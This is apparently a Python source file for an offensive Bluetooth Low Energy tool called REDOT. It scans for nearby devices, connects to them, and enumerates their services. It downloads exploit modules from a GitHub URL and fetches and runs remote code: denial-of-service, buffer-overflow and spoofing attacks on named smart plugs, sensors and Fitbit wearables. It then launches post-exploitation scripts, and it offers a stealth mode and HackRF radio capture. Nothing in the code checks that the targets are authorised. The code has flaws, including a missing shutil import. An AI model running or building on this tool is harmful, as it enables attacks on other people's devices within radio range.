#!/usr/bin/env python3
# REDOT: Advanced BLE Recon + Exploit Scanner

import asyncio
import argparse
import logging
import time
import csv
import json
import os
import sys
import importlib
import glob
import urllib.request
import subprocess
from datetime import datetime
from bleak import BleakScanner, BleakClient
from bleak.exc import BleakError

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "../../logs/ble_scan")
EXPLOITS_DIR = os.path.join(BASE_DIR, "exploits")
POSTEX_DIR = os.path.join(BASE_DIR, "../../modules/postex")

GITHUB_EXPLOITS_RAW_BASE = "https://raw.githubusercontent.com/s0m3on35/REDoT/main/modules/recon/exploits"

os.makedirs(LOG_DIR, exist_ok=True)

# === Logging ===
logger = logging.getLogger("ble_scan")
logger.setLevel(logging.INFO)

def log(msg):
    if not ARGS or not ARGS.stealth:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    logger.info(msg)

def setup_logger(log_file):
    handler = logging.FileHandler(log_file)
    formatter = logging.Formatter('[%(asctime)s] %(message)s', datefmt='%H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

# === Exploit Management ===
def download_file(url, dest):
    try:
        urllib.request.urlretrieve(url, dest)
        log(f"[Update] Downloaded {url}")
        return True
    except Exception as e:
        log(f"[Update] Failed to download {url}: {e}")
        return False

def update_exploits():
    log("[Update] Fetching exploit modules...")
    os.makedirs(EXPLOITS_DIR, exist_ok=True)
    exploit_files = [
        "ti_sensortag_dos.py",
        "nordic_uart_bof.py",
        "generic_battery_spoof.py",
        "xiaomi_smartplug_bof.py",
        "fitbit_hr_spoof.py"
    ]
    for name in exploit_files:
        url = f"{GITHUB_EXPLOITS_RAW_BASE}/{name}"
        dest = os.path.join(EXPLOITS_DIR, name)
        download_file(url, dest)

def classify_device(name, mdata):
    if not name:
        return "Unknown"

    name = name.lower()
    if "fitbit" in name:
        return "Wearable"
    elif "tag" in name or "sensor" in name:
        return "IoT Sensor"
    elif "plug" in name:
        return "Smart Plug"
    elif "uart" in name:
        return "Debug Device"
    elif mdata:
        keys = [str(k) for k in mdata.keys()]
        if any(k.startswith("76") for k in keys):
            return "Apple Device"
    return "Unknown"

class BLEOffensiveScanner:
    def __init__(self, args):
        self.args = args
        self.devices = {}
        self.exploit_modules = []
        self.load_exploits()

    def detection_callback(self, device, advertisement_data):
        if device.rssi < self.args.rssi:
            return
        if self.args.name and (device.name is None or self.args.name.lower() not in device.name.lower()):
            return

        info = {
            "address": device.address,
            "name": device.name or "Unknown",
            "rssi": device.rssi,
            "service_uuids": advertisement_data.service_uuids or [],
            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {},
        }

        info["type"] = classify_device(info["name"], advertisement_data.manufacturer_data)

        if device.address not in self.devices or info["rssi"] > self.devices[device.address]["rssi"]:
            self.devices[device.address] = info
            log(f"Discovered: {info['address']} | {info['name']} | {info['type']} | RSSI: {info['rssi']} dBm")

    def load_exploits(self):
        if not os.path.exists(EXPLOITS_DIR):
            log("Exploit directory missing")
            return
        for f in glob.glob(os.path.join(EXPLOITS_DIR, "*.py")):
            if f.endswith("__init__.py"):
                continue
            try:
                spec = importlib.util.spec_from_file_location(os.path.basename(f)[:-3], f)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                self.exploit_modules.append(mod)
                log(f"[Exploit] Loaded {mod.__name__}")
            except Exception as e:
                log(f"[Exploit] Failed to load {f}: {e}")

    async def run_scan(self):
        scanner = BleakScanner()
        scanner.register_detection_callback(self.detection_callback)
        log(f"Scanning for {self.args.duration}s...")
        await scanner.start()
        await asyncio.sleep(self.args.duration)
        await scanner.stop()
        log(f"Scan complete. Found {len(self.devices)} device(s).")
        self.export_results()

    def export_results(self):
        if not self.args.output:
            return
        path = self.args.output
        if not self.args.no_timestamp:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = path.replace(".csv", f"_{ts}.csv").replace(".json", f"_{ts}.json")

        log(f"Exporting results to {path}")
        os.makedirs(os.path.dirname(path), exist_ok=True)

        if self.args.output_format == "json":
            with open(path, "w") as f:
                json.dump(list(self.devices.values()), f, indent=2)
        else:
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Address", "Name", "RSSI", "Service UUIDs", "Manufacturer Data", "Type"])
                for d in self.devices.values():
                    writer.writerow([
                        d["address"],
                        d["name"],
                        d["rssi"],
                        ";".join(d["service_uuids"]),
                        ";".join(f"{k}:{v}" for k, v in d["manufacturer_data"].items()),
                        d["type"]
                    ])

    async def active_interrogate(self):
        log("Starting active BLE interrogation...")
        for addr, info in self.devices.items():
            try:
                async with BleakClient(addr, timeout=15) as client:
                    if not await client.is_connected():
                        continue
                    services = await client.get_services()
                    log(f"{addr} services:")
                    for svc in services:
                        log(f" Service: {svc.uuid}")
                        for char in svc.characteristics:
                            props = ",".join(char.properties)
                            log(f"  Char: {char.uuid} ({props})")
                    await self.run_exploits(client, info)
            except Exception as e:
                log(f"Interrogation error on {addr}: {e}")

    async def run_exploits(self, client, device_info):
        name = device_info["name"].lower()
        uuids = [s.lower() for s in device_info.get("service_uuids", [])]

        for mod in self.exploit_modules:
            brands = [b.lower() for b in getattr(mod, "TARGET_BRAND_NAMES", [])]
            targets = [u.lower() for u in getattr(mod, "TARGET_SERVICE_UUIDS", [])]
            if any(b in name for b in brands) or any(t in uuids for t in targets):
                log(f"[Exploit] Running {mod.__name__} on {device_info['address']}")
                try:
                    await mod.run_exploit(client, device_info)
                    self.chain_postex(device_info)
                except Exception as e:
                    log(f"Exploit error: {e}")

    def chain_postex(self, device_info):
        if not os.path.exists(POSTEX_DIR):
            return
        for mod in glob.glob(os.path.join(POSTEX_DIR, "*.py")):
            try:
                log(f"[PostEx] Triggering {os.path.basename(mod)} for {device_info['address']}")
                subprocess.Popen(["python3", mod, "--target", device_info["address"]])
            except Exception as e:
                log(f"[PostEx] Failed: {e}")

    def run_sdr_emulation(self):
        if not shutil.which("hackrf_transfer"):
            log("[SDR] HackRF tools not installed.")
            return
        log("[SDR] Starting passive HackRF capture...")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        sdr_file = os.path.join(LOG_DIR, f"ble_rf_capture_{ts}.iq")
        subprocess.Popen(["hackrf_transfer", "-r", sdr_file, "-f", "2402000000", "-s", "8000000", "-a", "1", "-l", "32", "-g", "20", "-n", "80000000"])

# === ARGUMENTS ===
def parse_args():
    parser = argparse.ArgumentParser(description="REDOT BLE Recon + Exploit Toolkit")
    parser.add_argument("-r", "--rssi", type=int, default=-80)
    parser.add_argument("-n", "--name", type=str)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("-o", "--output", type=str, default=os.path.join(LOG_DIR, "ble_scan_results.csv"))
    parser.add_argument("-f", "--output-format", choices=["csv", "json"], default="csv")
    parser.add_argument("-a", "--active", action="store_true")
    parser.add_argument("-u", "--update", action="store_true")
    parser.add_argument("--no-timestamp", action="store_true")
    parser.add_argument("--stealth", action="store_true", help="Silent mode (no stdout)")
    parser.add_argument("--sdr", action="store_true", help="Enable passive SDR BLE capture with HackRF")
    return parser.parse_args()

# === MAIN ===
def main():
    global ARGS
    ARGS = parse_args()
    setup_logger(ARGS.output + ".log")

    if ARGS.update:
        update_exploits()

    scanner = BLEOffensiveScanner(ARGS)

    if ARGS.sdr:
        scanner.run_sdr_emulation()

    try:
        asyncio.run(scanner.run_scan())
        if ARGS.active:
            asyncio.run(scanner.active_interrogate())
    except KeyboardInterrupt:
        log("Interrupted.")

if __name__ == "__main__":
    main()
